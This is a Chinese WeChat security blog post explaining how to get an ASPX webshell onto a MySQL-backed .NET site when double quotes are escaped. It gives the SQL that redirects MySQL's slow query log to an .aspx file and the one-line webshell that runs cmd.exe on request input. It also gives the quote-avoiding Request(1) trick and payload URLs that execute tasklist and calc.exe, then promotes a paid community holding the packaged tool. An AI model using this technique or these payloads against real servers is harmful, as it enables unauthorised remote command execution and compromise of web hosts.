---
title: .NET下规避双引号实现MySQL写入Shell
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247486642&idx=3&sn=305cd0c1e5c7353c2974ad2e6cd55dad&chksm=fa5aa25fcd2d2b4979169495b5df1a53e3dfba98ee36773397ffd8d612209d9bb6ab36a8e6e3&scene=58&subscene=0#rd
source: dotNet安全研究僧
date: 2022-10-15
fetch_date: 2025-10-03T19:57:37.237259
---

# .NET下规避双引号实现MySQL写入Shell

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76GYPg8hTXpmlnkp3deaQTqIG0nZhMTYbg7sDMc6tzWJvEZOhG3q9DOg/0?wx_fmt=jpeg)

# .NET下规避双引号实现MySQL写入Shell

专攻.NET安全的

dotNet安全矩阵

# 0x01 背景

.NET安全矩阵群有位师傅私聊说明遇到Mysql写ASPX一句话木马总报错的问题，经过一连串的测试发现只要代码里出现双引号就会像PHP一样自动转义成\"，本文也是记录解决这个问题的大致过程

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76jTvcq0nbfuichJuzh9OZhdjVoycSekjF5sV61MMuxuWsCPFL8UTbUeQ/640?wx_fmt=png)

## 1.1 应用场景

站点是基于mysql+aspx架构设计，root账户写.net一句话木马报错问题，已知的前置条件是Mysql > 5.6.34，因为较高版本的Mysql有secure\_file\_priv，所以不能通过outfile写shell，只能用写log日志的方式尝试拿shell，定向写入日志文件SQL如下

```
set global slow_query_log = 1;set global slow_query_log_file='d:/logshell.aspx';
```

开启后通过URL请求注入点写入这段 <%Shell("cmd.exe /c " & System.Web.HttpContext.Current.Request("content"))%> 会报错，原因在于这个aspx站对双引号做了转义处理，这样就变成了 \"cmd.exe/c \"，导致无法正常写入

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76iaO6DjUMFRR2M2THp8NvJqBOZhvuDafj70nNm3PxNqFkibSmhfbptmtw/640?wx_fmt=png)

遇到这个对单引号、双引号做转义的场景时，可以用类似php里参数传递数字即可，这里改成
System.Web.HttpContext.Current.Request(1)，如果要看回显内容需要曲线将结果写入站点路径下的文本里，所以传递的payload如下，成功将tasklist写入到2.txt文件里

```
/logshell.aspx?1=cmd.exe%20/c%20tasklist%20>%20c:\\windows\\temp\\2.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76UOkEzJFf6NhvYFXOibVD9NABxaiaDfkd00v5Lmrz4iafdbyIoSSMjmG2Q/640?wx_fmt=png)

写这里需要注意一点，直接请求logshell.aspx时会抛出Pathname错误，不用慌只需传递参数1即可，例如下图成功将tasklist写入到2.txt文件里

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76G2tiaHRZvpumb7fh3jTucjOD7jTYocCRP1kjOnJSEaYT951TplQxHwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76bIbZLV70jCEWStdajB21Nia7qN9qCoOQWkGukZicleLMOJkI32gVthmg/640?wx_fmt=jpeg)

如果不想回显，可直接请求/logshell.aspx?1=c:\windows\system32\calc.exe运行可执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76XVRkRSCFlvI44icp8hIZDiaVlxawLCfMkicujytmyS9eAt9PdomlP5STQ/640?wx_fmt=png)

这样就实现了规避单双引号字符，成功利用Mysql写入aspx一句话木马，最后看到师傅完成任务，我也特别高兴，师傅还要写个完整版的文章投稿到知识星球里，非常欢迎。**工具已打包在星球，感兴趣的师傅可以自行研究测试。**

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb76vsasABCHRg6Uvz1XpHVqMiaGEicN1LLw3PwH1iaPic9n70OnrVajGy7xlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicK3q7GONYyLblZgMNjEb768OSmRsGjCjvNsY5o5slCq8dKr3vCbicRvtQcoXibibwQgricGxDTlMAHTg/640?wx_fmt=jpeg)

**免责声明** 由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号dotnet安全矩阵及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

# 0x02 星球优惠活动

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。**星球提供50元代金劵，师傅们先到先得噢！扫描星球亮点里的二维码即可加入我们。**

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibuxMvdKPXjjMPhQjaCh2vwvLYKIWu5xbbR52F3JahJNvjfDw1jd3gy5Kgwh92quxrtlluFs0sIdQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布**很多高质量的.NET**安全资源，可以说市面上很少见，都是干货。其中主题包括**.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库**等等，后续还会倾力打造**专刊、视频**等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibHErRN3IhgSaicia7Rl5SF0plpcuicd0KG8Cn7vGczlBRtvSJvicWejH7TOro6AGLQ627SvVzxzBnphg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58UeoxTMuRezdHEJu6Hp08Xgm2F49cyBI1zlcj5XqLJK8zedWlUjibYmia3g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

dotNet安全矩阵知识星球 — 聚焦于微软.NET安全技术，关注基于.NET衍生出的各种红蓝攻防对抗技术、分享内容不限于 .NET代码审计、 最新的.NET漏洞分析、反序列化漏洞研究、有趣的.NET安全Trick、.NET开源软件分享、. NET生态等热点话题、还可以获得阿里、蚂蚁、字节等大厂内推的机会.

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过